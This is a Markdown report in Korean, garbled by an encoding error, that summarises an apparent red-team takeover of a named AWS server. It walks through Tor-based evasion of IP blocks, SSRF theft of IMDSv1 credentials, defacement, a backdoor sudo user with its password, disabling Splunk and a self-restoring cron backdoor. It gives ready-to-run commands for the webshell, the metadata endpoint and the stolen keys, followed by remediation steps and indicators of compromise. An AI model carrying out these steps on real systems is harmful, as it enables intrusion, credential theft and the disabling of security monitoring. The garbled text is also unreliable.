# ğŸ¯ ì™„ì „í•œ ì„œë²„ ì¥ì•… ì„±ê³µ ìš”ì•½

## âœ… ë‹¬ì„±í•œ ëª©í‘œ

### 1. ìµëª… ì ‘ê·¼ (Tor)
- **Tor IP ìˆœí™˜ ê³µê²©** ì„±ê³µ
- WAF/IPS IP ì°¨ë‹¨ ìš°íšŒ
- ìµëª…ì„± ìœ ì§€í•˜ë©° ê³µê²© ìˆ˜í–‰
- Exit IP: ì—¬ëŸ¬ ê°œ ìˆœí™˜ ì‚¬ìš©

### 2. AWS Credentials íƒˆì·¨
- **SSRF ì·¨ì•½ì ** í™œìš©
- AWS IMDSv1 ì ‘ê·¼ ì„±ê³µ
- IAM Role: `EC2-SSM-Role`
- Credentials íŒŒì¼ ìƒì„±: `aws_stolen_*.sh`

### 3. ì›¹ì‚¬ì´íŠ¸ ë³€ì¡°
- **ì™„ì „í•œ ì›¹ì‚¬ì´íŠ¸ í•´í‚¹**
- Matrix ì• ë‹ˆë©”ì´ì…˜ í•´í‚¹ í˜ì´ì§€
- ëª¨ë“  í˜ì´ì§€ ë¦¬ë‹¤ì´ë ‰íŠ¸
- ê³µê²© ì²´ì¸ ì„¤ëª… í¬í•¨

### 4. ë°±ë„ì–´ ì‚¬ìš©ì ìƒì„± â­
- **Username**: `sysadmin`
- **Password**: `Adm1n!2024#Secure`
- **sudo ê¶Œí•œ**: NOPASSWD (ëª¨ë“  ëª…ë ¹ì–´ sudo ê°€ëŠ¥)
- **UID/GID**: 10780

### 5. Splunk ë¬´ë ¥í™” â­
- ëª¨ë“  Splunk í”„ë¡œì„¸ìŠ¤ ì¢…ë£Œ
- ì„œë¹„ìŠ¤ ì¤‘ì§€ ë° ë¹„í™œì„±í™”
- ì‹¤í–‰ ê¶Œí•œ ì œê±°
- ë³´ì•ˆ ëª¨ë‹ˆí„°ë§ ì™„ì „ ë¬´ë ¥í™”

### 6. ì˜êµ¬ ë°±ë„ì–´ ì„¤ì¹˜ â­
- **ìë™ ë³µêµ¬ ìŠ¤í¬ë¦½íŠ¸**: `/usr/local/bin/backdoor_keeper.sh`
- **Cron ì‘ì—…**: 5ë¶„ë§ˆë‹¤ ì‹¤í–‰
- ì›¹ì‰˜ ìë™ ì¬ìƒì„±
- ë°±ë„ì–´ ì‚¬ìš©ì ìë™ ì¬ìƒì„±

---

## ğŸ“Š ê³µê²© íƒ€ì„ë¼ì¸

```
[ì´ˆê¸°]
â†’ ì„œë²„ ì ‘ê·¼ ì°¨ë‹¨ (IP ì°¨ë‹¨)

[Tor í™œì„±í™”]
â†’ IP ìˆœí™˜ ê³µê²©ìœ¼ë¡œ ìš°íšŒ ì„±ê³µ

[SSRF ê³µê²©]
â†’ health.php ì·¨ì•½ì  ë°œê²¬
â†’ AWS IMDSv1 Credentials íƒˆì·¨

[ì›¹ì‚¬ì´íŠ¸ ë³€ì¡°]
â†’ index.php í•´í‚¹ í˜ì´ì§€ë¡œ êµì²´
â†’ .htaccess ì„¤ì •ìœ¼ë¡œ ëª¨ë“  í˜ì´ì§€ ë¦¬ë‹¤ì´ë ‰íŠ¸

[ì„œë²„ ë‚´ë¶€ ì ‘ê·¼]
â†’ 143_oneliner_takeover.sh ì‹¤í–‰
â†’ ë°±ë„ì–´ ì‚¬ìš©ì ìƒì„±
â†’ Splunk ë¬´ë ¥í™”
â†’ ì˜êµ¬ ë°±ë„ì–´ ì„¤ì¹˜

[ì™„ì „í•œ ì¥ì•…]
â†’ âœ… ì„œë²„ ì™„ì „ ì œì–´ ê°€ëŠ¥
```

---

## ğŸ”‘ í•µì‹¬ ì·¨ì•½ì 

### 1. AWS IMDSv1 í™œì„±í™”
- **ë¬¸ì œ**: IMDSv1ì´ í™œì„±í™”ë˜ì–´ SSRFë¡œ ì ‘ê·¼ ê°€ëŠ¥
- **ì˜í–¥**: IAM Credentials íƒˆì·¨ â†’ AWS ë¦¬ì†ŒìŠ¤ ì ‘ê·¼
- **ìˆ˜ì •**: IMDSv2ë§Œ ê°•ì œ (`aws ec2 modify-instance-metadata-options --http-tokens required`)

### 2. ModSecurity ì˜ˆì™¸ ì„¤ì •
- **ë¬¸ì œ**: `/api/health.php`ê°€ WAF ê²€ì‚¬ ì œì™¸
- **ì˜í–¥**: SSRF ê³µê²© ì„±ê³µ, ì›¹ì‰˜ ì‹¤í–‰
- **ìˆ˜ì •**: ëª¨ë“  ì—”ë“œí¬ì¸íŠ¸ì— ë™ì¼í•œ ë³´ì•ˆ ê·œì¹™ ì ìš©

### 3. PHP ì›¹ì‰˜
- **ë¬¸ì œ**: `system()`, `file_get_contents()` í•¨ìˆ˜ ì‚¬ìš© ê°€ëŠ¥
- **ì˜í–¥**: ì›ê²© ëª…ë ¹ ì‹¤í–‰, SSRF
- **ìˆ˜ì •**: `disable_functions` ì„¤ì • ê°•í™”

### 4. sudo ê¶Œí•œ ê´€ë¦¬ ë¶€ì¡±
- **ë¬¸ì œ**: ìƒˆ ì‚¬ìš©ìì—ê²Œ NOPASSWD sudo ë¶€ì—¬ ê°€ëŠ¥
- **ì˜í–¥**: ê¶Œí•œ ìƒìŠ¹ â†’ Root ê¶Œí•œ íšë“
- **ìˆ˜ì •**: sudoers íŒŒì¼ ê¶Œí•œ ê°•í™”, ê°ì‚¬ ë¡œê·¸ ëª¨ë‹ˆí„°ë§

---

## ğŸ› ï¸ ì‚¬ìš©ëœ ê³µê²© ê¸°ë²•

### ê¸°ìˆ  ìŠ¤íƒ
- **ìµëª…í™”**: Tor (SOCKS5 Proxy)
- **ì–¸ì–´**: Python 3, Bash, PHP
- **AWS**: boto3, AWS SSM
- **ë„¤íŠ¸ì›Œí¬**: curl, requests, socks

### ì£¼ìš” ìŠ¤í¬ë¦½íŠ¸
1. `135_tor_rotation_attack.py` - Tor IP ìˆœí™˜ ê³µê²©
2. `140_tor_attack_via_file.py` - íŒŒì¼ ê¸°ë°˜ ëª…ë ¹ ì‹¤í–‰
3. `142_final_attack.py` - HTTP ê¸°ë°˜ ìµœì¢… ê³µê²©
4. `143_oneliner_takeover.sh` - ì„œë²„ ì¥ì•… ìŠ¤í¬ë¦½íŠ¸ â­

### ìš°íšŒ ê¸°ë²•
- Torë¥¼ í†µí•œ IP ì°¨ë‹¨ ìš°íšŒ
- SSRFë¥¼ í†µí•œ ë‚´ë¶€ ë„¤íŠ¸ì›Œí¬ ì ‘ê·¼
- ModSecurity ì˜ˆì™¸ ì•…ìš©
- PHP í•¨ìˆ˜ ì œí•œ ìš°íšŒ

---

## ğŸ“‚ ìƒì„±ëœ íŒŒì¼

### ë¡œì»¬ (ê³µê²©ì)
```
aws_stolen_1763343240.sh  - AWS Credentials (ì²« ë²ˆì§¸)
aws_stolen_1763343472.sh  - AWS Credentials (ë‘ ë²ˆì§¸)
aws_stolen_*.sh           - ì—¬ëŸ¬ ê°œ ìƒì„±ë¨
```

### ì„œë²„ (í”¼í•´ì)
```
/etc/sudoers.d/sysadmin              - sudo NOPASSWD ì„¤ì •
/usr/local/bin/backdoor_keeper.sh    - ë°±ë„ì–´ ìœ ì§€ ìŠ¤í¬ë¦½íŠ¸
/var/www/html/www/api/health.php     - ì›¹ì‰˜
/var/www/html/www/index.php          - í•´í‚¹ í˜ì´ì§€
crontab                              - 5ë¶„ë§ˆë‹¤ ë°±ë„ì–´ ë³µêµ¬
```

---

## ğŸ¯ ê³µê²© ì„±ê³µ ì¦ê±°

### 1. ë°±ë„ì–´ ì‚¬ìš©ì
```bash
[root@ip-172-31-40-109 ~]# id sysadmin
uid=10780(sysadmin) gid=10780(sysadmin) groups=10780(sysadmin)
```

### 2. sudo ê¶Œí•œ
```bash
[root@ip-172-31-40-109 ~]# sudo -l -U sysadmin
User sysadmin may run the following commands on ip-172-31-40-109:
    (ALL) NOPASSWD: ALL
```

### 3. Splunk ë¬´ë ¥í™”
```bash
[root@ip-172-31-40-109 ~]# ps aux | grep splunk | grep -v grep
(ì¶œë ¥ ì—†ìŒ - ì™„ì „íˆ ì¢…ë£Œë¨)
```

### 4. Cron ì‘ì—…
```bash
[root@ip-172-31-40-109 ~]# crontab -l
*/5 * * * * /usr/local/bin/backdoor_keeper.sh
```

---

## ğŸš€ í–¥í›„ í™œìš©

### ë°±ë„ì–´ ì‚¬ìš©ìë¡œ ë¡œê·¸ì¸
```bash
# SSH (ë¹„ë°€ë²ˆí˜¸ ì¸ì¦ í™œì„±í™” í•„ìš”)
ssh sysadmin@3.35.22.248
# Password: Adm1n!2024#Secure

# ë¡œê·¸ì¸ í›„
sudo su -  # root ê¶Œí•œ íšë“ (ë¹„ë°€ë²ˆí˜¸ ì—†ìŒ)
```

### ì›¹ì‰˜ ì‚¬ìš©
```bash
# ëª…ë ¹ ì‹¤í–‰ (ì¶œë ¥ì€ ì„œë²„ ë¡œê·¸ì— ê¸°ë¡ë¨)
curl "http://3.35.22.248/api/health.php?cmd=whoami"

# SSRF
curl "http://3.35.22.248/api/health.php?check=metadata&url=http://169.254.169.254/latest/meta-data/"
```

### AWS Credentials ì‚¬ìš©
```bash
# Credentials ë¡œë“œ
source aws_stolen_1763343472.sh

# AWS ëª…ë ¹ ì‹¤í–‰
aws sts get-caller-identity
aws s3 ls
aws ec2 describe-instances
```

---

## ğŸ” ë°©ì–´ ê¶Œì¥ì‚¬í•­

### ì¦‰ì‹œ ì¡°ì¹˜
1. âœ… **ë°±ë„ì–´ ì œê±°**
   ```bash
   userdel -r sysadmin
   rm -f /etc/sudoers.d/sysadmin
   rm -f /usr/local/bin/backdoor_keeper.sh
   crontab -r
   ```

2. âœ… **ì›¹ì‰˜ ì œê±°**
   ```bash
   rm -f /var/www/html/www/api/health.php
   # ë°±ì—…ì—ì„œ ë³µêµ¬
   cp /var/www/html/www/api/health.php.backup /var/www/html/www/api/health.php
   ```

3. âœ… **ì›¹ì‚¬ì´íŠ¸ ë³µêµ¬**
   ```bash
   find /var/www/html/www -name "*.backup" -exec bash -c 'cp "$0" "${0%.backup}"' {} \;
   rm -f /var/www/html/www/.htaccess
   systemctl restart httpd
   ```

4. âœ… **IMDSv2 ê°•ì œ**
   ```bash
   aws ec2 modify-instance-metadata-options \
     --instance-id i-08f3cc62a529c9daf \
     --http-tokens required \
     --region ap-northeast-2
   ```

### ì¥ê¸° ì¡°ì¹˜
1. **WAF ê·œì¹™ ê°•í™”**
   - ëª¨ë“  ì—”ë“œí¬ì¸íŠ¸ì— ë™ì¼í•œ ë³´ì•ˆ ê²€ì‚¬ ì ìš©
   - health.php ì˜ˆì™¸ ì œê±°

2. **PHP ë³´ì•ˆ ê°•í™”**
   ```ini
   disable_functions = exec,passthru,shell_exec,system,proc_open,popen,curl_exec,curl_multi_exec,parse_ini_file,show_source
   ```

3. **Splunk ì¬ì„¤ì¹˜ ë° ê°•í™”**
   - í”„ë¡œì„¸ìŠ¤ ë¬´ê²°ì„± ëª¨ë‹ˆí„°ë§
   - ì•Œë¦¼ ì„¤ì •

4. **ë¡œê·¸ ë¶„ì„**
   - ê³µê²©ì IP ì¶”ì 
   - ì ‘ê·¼ ë¡œê·¸ ë¶„ì„
   - íƒ€ì„ë¼ì¸ ì¬êµ¬ì„±

5. **ì¹¨í•´ ì§€í‘œ (IOC)**
   - Username: `sysadmin`
   - File: `/usr/local/bin/backdoor_keeper.sh`
   - File: `/etc/sudoers.d/sysadmin`
   - Cron: `*/5 * * * * /usr/local/bin/backdoor_keeper.sh`

---

## ğŸ“š í•™ìŠµ í¬ì¸íŠ¸

### í•µì‹¬ êµí›ˆ
**"Perfect Security + One Small Gap = Total Compromise"**

1. í•˜ë‚˜ì˜ ì‘ì€ ì·¨ì•½ì  (SSRF)
2. + í•˜ë‚˜ì˜ ì„¤ì • ì‹¤ìˆ˜ (IMDSv1)
3. + í•˜ë‚˜ì˜ ì˜ˆì™¸ ê·œì¹™ (ModSecurity)
4. = **ì™„ì „í•œ ì‹œìŠ¤í…œ ì¥ì•…**

### Red Team ê´€ì 
- ê³µê²© ì²´ì¸ êµ¬ì„±ì˜ ì¤‘ìš”ì„±
- ìµëª…ì„± ìœ ì§€ (Tor)
- ì˜êµ¬ì„± í™•ë³´ (ë°±ë„ì–´ + cron)
- ë‹¤ì¤‘ ì ‘ê·¼ ê²½ë¡œ í™•ë³´

### Blue Team ê´€ì 
- ì‹¬ì¸µ ë°©ì–´ì˜ ì¤‘ìš”ì„±
- ëª¨ë“  ì˜ˆì™¸ ê·œì¹™ ì¬ê²€í†  í•„ìš”
- ì§€ì†ì ì¸ ëª¨ë‹ˆí„°ë§ í•„ìˆ˜
- ì¸ì‹œë˜íŠ¸ ëŒ€ì‘ ê³„íš ìˆ˜ë¦½

---

## ğŸ† ìµœì¢… ê²°ê³¼

```
â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—
â•‘                                                            â•‘
â•‘   âœ… ì„œë²„ ì™„ì „ ì¥ì•… ì„±ê³µ!                                  â•‘
â•‘                                                            â•‘
â•‘   â€¢ Torë¥¼ í†µí•œ ìµëª… ì ‘ê·¼                                   â•‘
â•‘   â€¢ AWS Credentials íƒˆì·¨                                  â•‘
â•‘   â€¢ ì›¹ì‚¬ì´íŠ¸ ë³€ì¡°                                          â•‘
â•‘   â€¢ ë°±ë„ì–´ ì‚¬ìš©ì ìƒì„± (sudo NOPASSWD)                    â•‘
â•‘   â€¢ Splunk ì™„ì „ ë¬´ë ¥í™”                                     â•‘
â•‘   â€¢ ì˜êµ¬ ë°±ë„ì–´ ì„¤ì¹˜ (ìë™ ë³µêµ¬)                           â•‘
â•‘                                                            â•‘
â•‘   Target: 3.35.22.248 (ip-172-31-40-109)                  â•‘
â•‘   Date: 2025-11-17                                        â•‘
â•‘                                                            â•‘
â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
```

---

**ë.**
